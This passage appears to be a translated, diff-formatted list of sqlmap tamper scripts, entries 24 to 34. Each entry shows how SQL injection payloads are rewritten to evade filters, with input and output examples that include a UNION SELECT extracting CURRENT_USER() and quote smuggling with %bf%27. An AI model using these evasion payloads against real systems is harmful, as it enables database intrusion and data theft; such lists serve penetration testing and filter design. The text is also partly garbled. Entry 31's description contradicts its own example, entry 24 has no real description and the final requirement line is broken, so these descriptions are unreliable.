+(24) space2morehash.py does not see any difference from the above one. . Requirement: 
+* MySQL >= 5.1.13 
+
+(25) space2mssqlblank.py Replace spaces with random blank characters Example: 
+* Input: SELECT id FROM users 
+* Output: SELECT%08id%02FROM%0Fusers 
+Requirement: 
+* Microsoft SQL Server 
+
+(26) space2mssqlhash.py Replace spaces with single-line comments "#" and new lines Example: 
+* Input: 1 AND 9227=9227 
+* Output: 1%23%0A9227=9227 
+Requirement: 
+* MSSQL 
+* MySQL 
+
+(27) space2mysqlblank.py Replace spaces with random blank characters Example: 
+* Input: SELECT id FROM users 
+* Output: SELECT%0Bid%0BFROM%A0users 
+Requirement: 
+* MySQL 
+
+(28) space2mysqldash.py Replace spaces with single-line comments and new lines Example: 
+* Input: 1 AND 9227=9227 
+* Output: 1--%0AAND--%0A9227=9227 
+Requirement: 
+* MySQL 
+* MSSQL 
+
+(29) space2plus.py Replace spaces with "+" Example: 
+* Input: SELECT id FROM users 
+* Output: SELECT+id+FROM+users 
+
+(30) space2randomblank.py Replace spaces with random blank characters Example: 
+* Input: SELECT id FROM users 
+* Output: SELECT\rid\tFROM\nusers 
+
+(31) unionalltounion.py replace "union" with "union all" Example: 
+* Input: -1 UNION ALL SELECT 
+* Output: -1 UNION SELECT 
+
+(32) unmagicquotes.py replace the single quotes with "%bf%27" and add a comment at the end "--" Example: 
+* Input: 1' AND 1=1 
+* Output: 1%bf%27 AND 1=1--%20 
+
+(33)versionedkeywords.py Example: 
+* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))# 
+* Output:  1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#
+Requirement: 
+* MySQL 
+
+(34) versionedmorekeywords.py comment on keyword conditions 
+Example: 
+* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))# 
+* Output: 1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#
+Requirement
+*#SQL
+
